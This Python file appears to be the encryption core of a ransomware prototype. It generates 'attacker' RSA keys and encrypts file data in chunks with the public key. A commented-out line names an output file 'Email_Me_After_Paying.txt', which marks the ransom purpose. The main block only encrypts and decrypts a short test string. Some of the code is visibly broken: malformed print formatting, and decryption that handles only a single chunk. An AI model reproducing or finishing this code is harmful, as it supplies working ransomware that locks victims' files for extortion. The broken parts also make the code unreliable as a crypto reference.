import base64
import os
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives import serialization as crypto_serialization
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.hazmat.primitives import hashes as crypto_hashes


def is_non_zero_file(fpath):
    return os.path.isfile(fpath) and os.path.getsize(fpath) > 0


# Generates RSA Encryption + Decryption keys / Public + Private keys
def genattackerkeys():
    dest_path = "./keysafe"
    try:
        os.makedirs(dest_path, 0o777, exist_ok=True)
    except OSError as err:
        dest_path = os.getcwd()
        print("Creation of destination failed. Current directory is :" % dest_path)
    except FileExistsError:
        print("Attacker files exist. Quitting without creating new keys.")
        print("Delete following folder and try again: " % dest_path)
    else:
        privkeypathstring = dest_path + '/private.pem'
        pubkeypathstring = dest_path + '/public.pem'
        private_key = rsa.generate_private_key(
            backend=crypto_default_backend(),
            public_exponent=65537,
            key_size=4096
        )
        public_key = private_key.public_key()

        private_key_pem = private_key.private_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PrivateFormat.PKCS8,
            crypto_serialization.NoEncryption())
        with open(privkeypathstring, 'wb') as f:
            f.write(private_key_pem)

        public_key_pem = public_key.public_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
        )
        with open(pubkeypathstring, 'wb') as f:
            f.write(public_key_pem)


def encrypt_data():
    f = open("./testFiles/f1.txt", 'rb')
    testfile = f.read()
    f.close()
    print(testfile)
    with open("./public.pem", "rb") as key_file:
        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                       backend=crypto_default_backend())
        enc_text = attacker_public_key.encrypt(testfile, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
    print(enc_text)


def encrypt_blob(fileblob, public_key_path):
    with open(public_key_path, "rb") as key_file:
        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                       backend=crypto_default_backend())
    chunk_size = 430
    offset = 0
    end_loop = False
    encrypted = b""
    while not end_loop:
        chunk = fileblob[offset: offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            end_loop = True
            chunk += b" " * (chunk_size - len(chunk))
        print(chunk)
        enc_chunk = attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
        encrypted += enc_chunk
        offset += chunk_size
    encrypted_blob = base64.b64encode(encrypted)
    print(encrypted_blob)
    return encrypted_blob
    # with open("./Email_Me_After_Paying.txt", "wb") as fa:
    #    fa.write(encrypted_blob)


def decrypt_blob(fileblob, private_key_path):
    fileblob = base64.b64decode(fileblob)
    with open(private_key_path, "rb") as key_file:
        attacker_private_key = crypto_serialization.load_pem_private_key(key_file.read(), password=None, backend=crypto_default_backend())
    dec_chunk = attacker_private_key.decrypt(fileblob, crypto_padding.OAEP(
        mgf=crypto_padding.MGF1(
            algorithm=crypto_hashes.SHA256()),
        algorithm=crypto_hashes.SHA256(),
        label=None
    ))
    print(dec_chunk)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print("Keys have been generated.")
    # genattackerkeys()
    # encrypt_data()
    out = encrypt_blob(b'Hello Dallas!', "./public.pem")
    decrypt_blob(out, "./private.pem")
